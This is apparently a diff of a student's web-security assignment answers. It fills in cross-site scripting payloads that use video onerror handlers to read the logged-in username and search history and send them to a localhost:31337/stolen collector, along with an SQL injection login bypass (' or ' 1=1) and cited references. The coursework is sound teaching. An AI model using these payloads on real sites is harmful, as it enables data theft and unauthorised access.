@@ -85,11 +85,44 @@ Part 1: Cross-site Scripting (35%)
 
 		Payload:
 
+		<video><source onerror="
+			var username = document.getElementById('logged-in-user').innerHTML;
+			alert(username);
+		};
+		">
+
+
+
+	https://www.hashemian.com/tools/html-url-encode-decode.php
+		<video><source onerror="
+			window.onload = function(){ 
+				var username = document.getElementById('logged-in-user').innerHTML;
+				alert(username);
+			};
+		">
+
+		<script> alert("Hi"); </script>
+
+
+
+
+
+		<video><source onerror="
+			window.onload = function(){ 
+				var username = document.getElementById('logged-in-user').innerHTML;
+				var last_search = document.getElementsByClassName('history-item')[1].innerHTML;
+				var theUrl = 'http://localhost:31337/stolen?user=' + username + ' &last_search=' + last_search;
+				var xmlHttp = new XMLHttpRequest();
+				xmlHttp.open( 'GET', theUrl, true );
+				xmlHttp.send(null);
+				alert(theUrl);
+			};
+		">
 
 
 
 		theUrl:
-		
+
 		
 
 	
@@ -134,9 +167,8 @@ ________________________________________________________________________________
 
 Part 3: SQL Injection (10%)
 
-	Username: TODO
-	Password: TODO
-
+	Username: victim
+	Password: ' or ' 1=1
 
 ________________________________________________________________________________________
 
@@ -180,12 +212,22 @@ Additional Questions
 
 	Q2 (optional, ungraded). Did you use code snippets from anywhere online that you need to cite?
 
+		---- 1 ----
 		https://www.w3schools.com/tags/ref_urlencode.ASP
 		https://www.veracode.com/security/xss
 		https://www.codegrepper.com/code-examples/javascript/xss+attack+without+script+tag
 		https://www.acunetix.com/websitesecurity/cross-site-scripting/
 		https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 		https://html5sec.org/
+
+
+		---- 2 ----
+
+
+		---- 3 ----
+		https://sechow.com/bricks/docs/login-1.html
+
+		---4---
 
 	Q3 (optional, ungraded). Do you have any suggestions for improving this assignment in the future?
 
